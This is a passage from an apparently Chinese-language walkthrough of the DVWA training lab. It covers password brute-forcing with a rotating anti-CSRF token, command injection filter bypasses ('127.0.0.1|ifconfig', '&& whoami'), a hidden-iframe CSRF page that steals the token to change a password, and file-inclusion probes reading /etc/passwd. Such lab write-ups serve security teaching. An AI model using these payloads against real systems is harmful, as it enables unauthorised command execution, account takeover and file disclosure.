    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>  
  
    <span class=k>if</span><span class=p>(</span> <span class=nv>$result</span> <span class=o>&amp;&amp;</span> <span class=nx>mysqli_num_rows</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>  
        <span class=c1>// Get users details  
</span><span class=c1></span>        <span class=nv>$row</span>    <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>);</span>  
        <span class=nv>$avatar</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;avatar&#34;</span><span class=p>];</span>  
  
        <span class=c1>// Login successful  
</span><span class=c1></span>        <span class=k>echo</span> <span class=s2>&#34;&lt;p&gt;Welcome to the password protected area </span><span class=si>{</span><span class=nv>$user</span><span class=si>}</span><span class=s2>&lt;/p&gt;&#34;</span><span class=p>;</span>  
        <span class=k>echo</span> <span class=s2>&#34;&lt;img src=</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>{</span><span class=nv>$avatar</span><span class=p>}</span><span class=nx>\\</span><span class=s2>&#34; /&gt;&#34;</span><span class=p>;</span>  
    <span class=p>}</span>  
    <span class=k>else</span> <span class=p>{</span>  
        <span class=c1>// Login failed  
</span><span class=c1></span>        <span class=nx>sleep</span><span class=p>(</span> <span class=nx>rand</span><span class=p>(</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>3</span> <span class=p>)</span> <span class=p>);</span>  
        <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&#34;</span><span class=p>;</span>  
    <span class=p>}</span>  
  
    <span class=p>((</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])))</span> <span class=o>?</span> <span class=k>false</span> <span class=o>:</span> <span class=nv>$___mysqli_res</span><span class=p>);</span>  
<span class=p>}</span>  
  
<span class=c1>// Generate Anti-CSRF token  
</span><span class=c1></span><span class=nx>generateSessionToken</span><span class=p>();</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>加入的token来防御CSRF同时增加爆破难度。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/6.png data-srcset="/images/dvwa/6.png, /images/dvwa/6.png 1.5x, /images/dvwa/6.png 2x" data-sizes=auto alt=/images/dvwa/6.png title=/images/dvwa/6.png></p><p>同样使用 Burp Suite，先将请求数据发送给 <code>Intruder</code> 模块，用 <code>§</code> 符号标记需要测试的两个数据，一个是 <code>password</code>，另一个是 <code>user_token</code>，本次使用 <code>Pitchfork</code> 攻击方式。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/7.png data-srcset="/images/dvwa/7.png, /images/dvwa/7.png 1.5x, /images/dvwa/7.png 2x" data-sizes=auto alt=/images/dvwa/7.png title=/images/dvwa/7.png></p><p>在 Option 选项中找到 Grep - Extract，设置从响应中获取 <code>user_token</code> ，这里用光标选中想要的内容即可。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/27.png data-srcset="/images/dvwa/27.png, /images/dvwa/27.png 1.5x, /images/dvwa/27.png 2x" data-sizes=auto alt=/images/dvwa/27.png title=/images/dvwa/27.png></p><p>第一个数据 <code>password</code> 仍然使用 Kali 内置的爆破字典 <code>/usr/share/wordlists/fasttrack.txt</code>；</p><p>第二个数据 <code>user_token</code> 从响应页面中递归获取，起始数据为当前未提交登录的页面的 <code>user_token</code>。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/28.png data-srcset="/images/dvwa/28.png, /images/dvwa/28.png 1.5x, /images/dvwa/28.png 2x" data-sizes=auto alt=/images/dvwa/28.png title=/images/dvwa/28.png></p><p>根据响应长度排序可以得到正确的password</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/8.png data-srcset="/images/dvwa/8.png, /images/dvwa/8.png 1.5x, /images/dvwa/8.png 2x" data-sizes=auto alt=/images/dvwa/8.png title=/images/dvwa/8.png></p><h2 id=common-injection>Common Injection</h2><p>命令注入（Command Injection），对一些函数的参数没有做过滤或过滤不严导致的，可以执行系统或者应用指令（CMD命令或者bash命令）的一种注入攻击手段。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一</p><p>shell 环境中用于拼接命令的符号有以下几个：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-Text data-lang=Text>&amp; --&gt; 前一条命令在后台运行  
&amp;&amp; --&gt; 当且仅当前一条命令执行成功后执行下一条命令  
|| --&gt; 当且仅当前一条命令执行失败后执行下一条命令  
| --&gt; 将前一条命令的标准输出（stdout）作为下一条命令的输入  
; --&gt; 无论前一条指令是否执行成功，都执行下一条指令  
</code></pre></td></tr></table></div></div><h3 id=low-1>low</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span>  <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get input  
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;ip&#39;</span> <span class=p>];</span>  
  
    <span class=c1>// Determine OS and execute the ping command.  
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=nx>stristr</span><span class=p>(</span> <span class=nx>php_uname</span><span class=p>(</span> <span class=s1>&#39;s&#39;</span> <span class=p>),</span> <span class=s1>&#39;Windows NT&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
        <span class=c1>// Windows  
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>  
    <span class=p>}</span>  
    <span class=k>else</span> <span class=p>{</span>  
        <span class=c1>// *nix  
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  -c 4 &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>  
    <span class=p>}</span>  
  
    <span class=c1>// Feedback for the end user  
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>{</span><span class=nv>$cmd</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>没有加任何防护，直接注入命令<code>127.0.0.1 && whoami</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/9.png data-srcset="/images/dvwa/9.png, /images/dvwa/9.png 1.5x, /images/dvwa/9.png 2x" data-sizes=auto alt=/images/dvwa/9.png title=/images/dvwa/9.png></p><h3 id=medium-1>medium</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span>  <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get input  
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;ip&#39;</span> <span class=p>];</span>  
  
    <span class=c1>// Set blacklist  
</span><span class=c1></span>    <span class=nv>$substitutions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>  
        <span class=s1>&#39;&amp;&amp;&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
        <span class=s1>&#39;;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
    <span class=p>);</span>  
  
    <span class=c1>// Remove any of the charactars in the array (blacklist).  
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=nx>array_keys</span><span class=p>(</span> <span class=nv>$substitutions</span> <span class=p>),</span> <span class=nv>$substitutions</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>  
  
    <span class=c1>// Determine OS and execute the ping command.  
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=nx>stristr</span><span class=p>(</span> <span class=nx>php_uname</span><span class=p>(</span> <span class=s1>&#39;s&#39;</span> <span class=p>),</span> <span class=s1>&#39;Windows NT&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
        <span class=c1>// Windows  
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>  
    <span class=p>}</span>  
    <span class=k>else</span> <span class=p>{</span>  
        <span class=c1>// *nix  
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  -c 4 &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>  
    <span class=p>}</span>  
  
    <span class=c1>// Feedback for the end user  
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>{</span><span class=nv>$cmd</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>在 Low 的基础上使用 <code>str_replace</code> 过滤符号 <code>&&</code> 和 <code>;</code>。</p><p><code>||</code> 、 <code>|</code> 、<code>&</code> 仍然可以使用，此外还可以使用 <code>&&&</code> 、 <code>&amp;;&</code> 等，过滤后就变为 <code>&</code> 、 <code>&&</code>，同样可以实现漏洞利用。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-Text data-lang=Text># ping a.b.c.d 失败，继续执行 ifconfig  
a.b.c.d||ifconfig  
  
# ifconfig 不接受输入  
127.0.0.1|ifconfig  
  
# ping 127.0.0.1 后台结束后返回  
127.0.0.1&amp;ifconfig  
</code></pre></td></tr></table></div></div><h3 id=high-1>high</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span>  <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get input  
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;ip&#39;</span> <span class=p>]);</span>  
  
    <span class=c1>// Set blacklist  
</span><span class=c1></span>    <span class=nv>$substitutions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>  
        <span class=s1>&#39;&amp;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
        <span class=s1>&#39;;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
        <span class=s1>&#39;| &#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
        <span class=s1>&#39;-&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
        <span class=s1>&#39;$&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
        <span class=s1>&#39;(&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
        <span class=s1>&#39;)&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
        <span class=s1>&#39;`&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
        <span class=s1>&#39;||&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>  
    <span class=p>);</span>  
  
    <span class=c1>// Remove any of the charactars in the array (blacklist).  
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=nx>array_keys</span><span class=p>(</span> <span class=nv>$substitutions</span> <span class=p>),</span> <span class=nv>$substitutions</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>  
  
    <span class=c1>// Determine OS and execute the ping command.  
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=nx>stristr</span><span class=p>(</span> <span class=nx>php_uname</span><span class=p>(</span> <span class=s1>&#39;s&#39;</span> <span class=p>),</span> <span class=s1>&#39;Windows NT&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
        <span class=c1>// Windows  
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>  
    <span class=p>}</span>  
    <span class=k>else</span> <span class=p>{</span>  
        <span class=c1>// *nix  
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  -c 4 &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>  
    <span class=p>}</span>  
  
    <span class=c1>// Feedback for the end user  
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>{</span><span class=nv>$cmd</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>使用 <code>trim</code> 去除字符串首尾的空白字符，然后又过滤了许多符号，但是没有过滤 <code>|</code> ，显然可以利用。</p><p>使用管道符 <code>|</code> 即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>127.0.0.1|ifconfig  
</code></pre></td></tr></table></div></div><h2 id=csrf>CSRF</h2><p>Cross-site request forgery，跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p><h3 id=low-2>low</h3><p>修改密码的链接：http://localhost/vulnerabilities/csrf/?password_new=132&password_conf=23&Change=Change#</p><p>在源码中只要password_new与password_conf一致即可修改密码。故直接发送上述链接吸引受害者点击即可修改密码。</p><h3 id=medium-2>medium</h3><p>相比于low添加了如下校验：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=nx>stripos</span><span class=p>(</span> <span class=nv>$_SERVER</span><span class=p>[</span> <span class=s1>&#39;HTTP_REFERER&#39;</span> <span class=p>]</span> <span class=p>,</span><span class=nv>$_SERVER</span><span class=p>[</span> <span class=s1>&#39;SERVER_NAME&#39;</span> <span class=p>])</span> <span class=o>!==</span> <span class=k>false</span>  
</code></pre></td></tr></table></div></div><p>即用户的请求头中的Referer字段必须包含了服务器的名字。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/10.png data-srcset="/images/dvwa/10.png, /images/dvwa/10.png 1.5x, /images/dvwa/10.png 2x" data-sizes=auto alt=/images/dvwa/10.png title=/images/dvwa/10.png></p><p>使用burp对其进行修改</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/12.png data-srcset="/images/dvwa/12.png, /images/dvwa/12.png 1.5x, /images/dvwa/12.png 2x" data-sizes=auto alt=/images/dvwa/12.png title=/images/dvwa/12.png></p><h3 id=high-2>high</h3><p>加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p>http://localhost/vulnerabilities/csrf/?password_new=12&password_conf=12&Change=Change&user_token=14299b179fba1e1934cc198a1a884bdc#</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=nx>checkToken</span><span class=p>(</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;user_token&#39;</span> <span class=p>],</span> <span class=nv>$_SESSION</span><span class=p>[</span> <span class=s1>&#39;session_token&#39;</span> <span class=p>],</span> <span class=s1>&#39;index.php&#39;</span> <span class=p>);</span>  
</code></pre></td></tr></table></div></div><p>这里想要达到攻击目的的话需要获取token。这里只有构造一个攻击页面，将其放置在目标服务器，引诱受害者访问，从而完成CSRF攻击。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-jsx data-lang=jsx><span class=p>&lt;</span><span class=nt>script</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text/javascript&#34;</span><span class=p>&gt;</span>  
    <span class=kd>function</span> <span class=nx>attack</span><span class=p>()</span>  
  <span class=p>{</span>  
   <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByName</span><span class=p>(</span><span class=s1>&#39;user_token&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=o>=</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;hack&#34;</span><span class=p>).</span><span class=nx>contentWindow</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByName</span><span class=p>(</span><span class=s1>&#39;user_token&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>;</span>  
  <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;transfer&#34;</span><span class=p>).</span><span class=nx>submit</span><span class=p>();</span>   
  <span class=p>}</span>  
<span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>  
   
<span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;&lt;http://192.168.109.136/dvwa/vulnerabilities/csrf&gt;&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;hack&#34;</span> <span class=na>border</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none;&#34;</span><span class=p>&gt;</span>  
<span class=p>&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>  
   
<span class=p>&lt;</span><span class=nt>body</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;attack()&#34;</span><span class=p>&gt;</span>  
  <span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;GET&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;transfer&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;&lt;http://localhost/vulnerabilities/csrf&gt;&#34;</span><span class=p>&gt;</span>  
   <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;password_new&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;password&#34;</span><span class=p>&gt;</span>  
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;password_conf&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;password&#34;</span><span class=p>&gt;</span>  
   <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;user_token&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span><span class=p>&gt;</span>  
  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;Change&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Change&#34;</span><span class=p>&gt;</span>  
   <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>  
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>  
</code></pre></td></tr></table></div></div><p>如果把上述页面加入到目标服务器，当受害者点击这个页面，脚本会通过一个看不见的框架访问修改密码的页面获取页面中的token，并向服务器发送修改密码的请求，以完成CSFR攻击。</p><p>因为跨域问题，所以这个攻击代码需要注入到目标服务器中才可能完成攻击，可以利用XSS漏洞协助获取CSRF token。</p><h2 id=文件包含>文件包含</h2><h3 id=文件包含与漏洞><strong>文件包含与漏洞</strong></h3><p>文件包含:</p><p>开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含。</p><p>文件包含漏洞:</p><p>开发人员为了使代码更灵活,会将被包含的文件设置为变量,用来进行动态调用,从而导致客户端可以恶意调用一个恶意文件,造成文件包含漏洞。</p><h3 id=文件包含漏洞用到的函数><strong>文件包含漏洞用到的函数</strong></h3><p>require:找不到被包含的文件，报错，并且停止运行脚本。</p><p>include:找不到被包含的文件,只会报错，但会继续运行脚本。</p><p>require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。</p><p>include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。</p><h3 id=目录遍历与文件包含的区别><strong>目录遍历与文件包含的区别</strong></h3><p>目录遍历是可以读取web目录以外的其他目录,根源在于对路径访问权限设置不严格，针对本系统。</p><p>文件包含是利用函数来包含web目录以外的文件，分为本地包含和远程包含。</p><h3 id=文件包含特征><strong>文件包含特征</strong></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>?page=a.php  
?home=b.html  
?file=content  
</code></pre></td></tr></table></div></div><h3 id=检测方法><strong>检测方法</strong></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>?file=../../../../etc/passwd  
?page=file:///etc/passwd  
?home=main.cgi  
?page=http://www.a.com/1.php  
&lt;http://1.1.1.1/dir/file.txt&gt;  
</code></pre></td></tr></table></div></div><h3 id=low-3>low</h3><p>没有任何过滤，可以进行包含任意文件。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>&lt;http://127.0.0.1/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.php&gt;  
</code></pre></td></tr></table></div></div><h3 id=medium-3>medium</h3><p>添加了两个过滤条件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=nv>$file</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=k>array</span><span class=p>(</span> <span class=s2>&#34;http://&#34;</span><span class=p>,</span> <span class=s2>&#34;https://&#34;</span> <span class=p>),</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$file</span> <span class=p>);</span>  
<span class=nv>$file</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=k>array</span><span class=p>(</span> <span class=s2>&#34;../&#34;</span><span class=p>,</span> <span class=s2>&#34;..</span><span class=se>\\</span><span class=s2>&#34;&#34; ), &#34;&#34;, </span><span class=si>$file</span><span class=s2> );  
